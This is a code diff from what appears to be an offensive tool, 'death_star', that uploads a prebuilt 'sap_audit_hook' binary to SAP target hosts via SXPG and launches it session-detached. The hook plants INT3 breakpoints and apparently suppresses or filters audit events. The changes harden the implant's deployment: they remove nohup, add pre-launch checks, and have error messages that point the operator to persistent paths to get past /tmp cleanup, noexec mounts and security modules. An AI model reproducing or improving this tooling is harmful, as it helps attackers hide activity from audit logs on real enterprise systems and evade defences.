@@ -576,18 +576,21 @@ def upload_prebuilt_binary(node,
         raise DeathStarError(
             f"chmod +x failed: {r.get('error') or 'unknown'}")
 
-    # Sanity — run `--help` and check the output contains "sap_audit_hook"
-    # or "Usage:" (both appear in Julian's --help output).  A broken /
-    # corrupted upload would fail this test.
+    # Sanity — run `--help` and check the output contains strings unique
+    # to Julian's usage() function: "--suppress" and "--filter CLASS".
+    # Previous loose check ("sap_audit_hook" in output) false-positived
+    # on error messages containing the binary path, e.g.
+    # "nohup: failed to run command '/tmp/sap_audit_hook': No such file".
     check = _run(node, binary_path, "--help",
                   label=f"verify binary — {binary_path} --help")
-    got = " ".join(check.get("output") or []).lower()
-    if ("sap_audit_hook" not in got and "usage:" not in got):
+    got = " ".join(check.get("output") or [])
+    if "--suppress" not in got or "--filter" not in got:
         raise DeathStarError(
             f"pre-built binary at {binary_path} does not produce "
-            f"expected --help output — corrupted upload or "
+            f"expected --help output (need '--suppress' and '--filter' "
+            f"in usage text) — corrupted upload or "
             f"incompatible target ABI (need Linux x86_64).  Got: "
-            f"{got[:200]!r}")
+            f"{got[:300]!r}")
     print(f"[+] {node.sid}: death_star: pre-built binary deployed — "
            f"{binary_path} ({len(binary_bytes)} B, "
            f"no compile needed on target)")
@@ -874,13 +877,27 @@ def launch(node, binary_path: str,
     #
     #   * If a previous pidfile exists, best-effort kill the old hook so
     #     the operator can re-arm without leaving orphan INT3s.
-    #   * ``setsid`` + ``nohup`` + ``&`` gives us a session-detached
-    #     background process; the operator's SXPG session teardown
-    #     doesn't reap it.
+    #   * ``setsid`` + ``&`` gives us a session-detached background
+    #     process; the operator's SXPG session teardown doesn't reap it.
     #   * ``$!`` is the last backgrounded PID → written to pidfile so
     #     ``stop()`` can find it.
     script = (
         f"#!/bin/sh\n"
+        # Pre-exec diagnostics — surface binary state before we try
+        # to run it.  Previous launches silently failed when nohup
+        # returned ENOENT; these lines give the operator hard evidence
+        # of what's on disk (or not).
+        f"echo DIAG: binary check — ls -la {binary_path}\n"
+        f"ls -la {binary_path} 2>&1\n"
+        f"if [ ! -f {binary_path} ]; then\n"
+        f"  echo STATUS: MISSING {binary_path}\n"
+        f"  exit 0\n"
+        f"fi\n"
+        f"if [ ! -x {binary_path} ]; then\n"
+        f"  echo DIAG: binary exists but is not executable\n"
+        f"  echo STATUS: NOT_EXECUTABLE {binary_path}\n"
+        f"  exit 0\n"
+        f"fi\n"
         # Best-effort cleanup of any prior instance.  Same PID sanity
         # checks as stop(): a stale pidfile might contain "2" or a
         # kernel PID; killing that would either fail (kernel threads
@@ -904,7 +921,14 @@ def launch(node, binary_path: str,
         f"fi\n"
         # Launch detached.  setsid gives a fresh session so the
         # operator's SXPG session teardown doesn't reap the hook.
-        f"setsid nohup {hook_cmdline} "
+        # nohup is NOT used — it caused spurious ENOENT failures on
+        # SUSE targets ("nohup: failed to run command: No such file
+        # or directory") even though the binary was present and
+        # executable.  setsid alone is sufficient: it creates a new
+        # session and the backgrounded process survives the parent's
+        # exit.  stdin is redirected from /dev/null so no SIGHUP is
+        # raised when the controlling terminal goes away.
+        f"setsid {hook_cmdline} "
         f">> {log_path} 2>&1 < /dev/null &\n"
         f"NEW=$!\n"
         f"echo $NEW > {pidfile_path}\n"
@@ -961,6 +985,19 @@ def launch(node, binary_path: str,
         raise DeathStarError(
             f"launch produced no STATUS line — raw output: "
             f"{' '.join(lines)!r}. Check {log_path} on the target.")
+    if status.startswith("MISSING"):
+        raise DeathStarError(
+            f"binary not found at launch time — the upload succeeded "
+            f"but the file vanished before the launcher ran.  Likely "
+            f"cause: /tmp cleanup (systemd-tmpfiles, tmpreaper) or a "
+            f"security module.  Try a persistent path like "
+            f"/usr/sap/tmp/ or /home/<sid>adm/.")
+    if status.startswith("NOT_EXECUTABLE"):
+        raise DeathStarError(
+            f"binary exists but is not executable — chmod +x reported "
+            f"success but the execute bit is not set.  Likely cause: "
+            f"/tmp mounted with noexec.  Try a persistent path like "
+            f"/usr/sap/tmp/ or /home/<sid>adm/.")
     if status.startswith("DIED"):
         raise DeathStarError(
             "hook process exited within 1 s of launch — likely "
